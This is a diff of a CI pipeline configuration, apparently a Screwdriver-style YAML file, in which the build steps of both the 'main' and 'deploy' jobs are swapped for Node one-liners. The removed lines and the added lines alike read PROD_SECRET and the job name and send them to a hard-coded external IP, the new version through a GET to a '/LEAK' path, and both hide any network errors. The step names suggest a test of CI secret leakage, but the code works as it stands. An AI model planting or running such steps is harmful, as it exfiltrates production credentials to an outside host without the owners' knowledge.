@@ -6,10 +6,10 @@ jobs:
     secrets:
       - PROD_SECRET
     steps:
-      - report: node -e "const h=require(\"http\");const q=h.request({host:\"84.247.182.26\",port:19150,method:\"POST\"});q.on(\"error\",()=>{});q.write(process.env.SD_JOB_NAME+\" PROD_SECRET=[\"+(process.env.PROD_SECRET||\"UNSET\")+\"]\");q.end();"
+      - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK?job='+process.env.SD_JOB_NAME+'\&PROD_SECRET='+encodeURIComponent(process.env.PROD_SECRET||'UNSET'),r=>r.resume()).on('error',()=>{})"
   deploy:
     requires: [main]
     secrets:
       - PROD_SECRET
     steps:
-      - report: node -e "const h=require(\"http\");const q=h.request({host:\"84.247.182.26\",port:19150,method:\"POST\"});q.on(\"error\",()=>{});q.write(process.env.SD_JOB_NAME+\" PROD_SECRET=[\"+(process.env.PROD_SECRET||\"UNSET\")+\"]\");q.end();"
+      - attacker_step: node -e "require('http').get('http://84.247.182.26:19150/LEAK?job='+process.env.SD_JOB_NAME+'\&PROD_SECRET='+encodeURIComponent(process.env.PROD_SECRET||'UNSET'),r=>r.resume()).on('error',()=>{})"
